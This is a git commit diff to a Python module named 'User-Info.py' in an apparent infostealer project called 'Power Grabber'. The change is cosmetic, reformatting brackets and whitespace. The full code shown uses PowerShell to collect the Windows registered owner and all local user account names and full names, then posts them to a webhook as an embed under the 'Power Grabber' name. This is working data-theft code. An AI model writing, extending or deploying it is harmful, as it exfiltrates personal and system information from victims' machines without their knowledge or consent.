6aee30e68133fe5d34998d63f62aa7267c8102c8
Powercascade <powercascade28@gmail.com>
2025-02-25 20:36:19 -0600

    Updated User-Info.py

--- Options/User-Info.py
+++ Options/User-Info.py
@@ -5,16 +5,12 @@ def get_windows_info():
     try:
         owner_result = subprocess.run(
             ["powershell", "-Command", "(Get-ComputerInfo).WindowsRegisteredOwner"],
-            capture_output=True, text=True, check=True
-        )
-        owner = owner_result.stdout.strip()
-        
+            capture_output=True, text=True, check=True)
+        owner = owner_result.stdout.strip()        
         user_info_result = subprocess.run(
             ["powershell", "-Command", "Get-WmiObject -Class Win32_UserAccount | Select-Object Name, FullName"],
-            capture_output=True, text=True, check=True
-        )
+            capture_output=True, text=True, check=True)
         user_info = user_info_result.stdout.strip().split('\n')
-        
         users = []
         for user in user_info:
             if user.strip() and "----" not in user and "--------" not in user:
@@ -22,7 +18,6 @@ def get_windows_info():
                 name = parts[0]
                 full_name = ' '.join(parts[1:])
                 users.append((name, full_name))
-                
         return owner, users
     except subprocess.CalledProcessError as e:
         return None, None
@@ -30,20 +25,14 @@ def send_webhook(owner, users):
     embed = {
         "username": "Power Grabber",
         "avatar_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true",
-        "embeds": [
-            {
+        "embeds": [{
                 "title": "User Info",
                 "color": 0x8b0000,
-                "fields": [
-                    {
+                "fields": [{
                         "name": "Windows Registered Owner",
                         "value": owner,
                         "inline": False
-                    }
-                ]
-            }
-        ]
-    }
+                    }]}]}
     for name, full_name in users:
         embed["embeds"][0]["fields"].append({
             "name": f"User Name: {name}",
@@ -53,8 +42,7 @@ def send_webhook(owner, users):
     response = requests.post(
         webhook_url, 
         data=json.dumps(embed), 
-        headers={"Content-Type": "application/json"}
-    )
+        headers={"Content-Type": "application/json"})
     if response.status_code == 204:
         pass
     else:
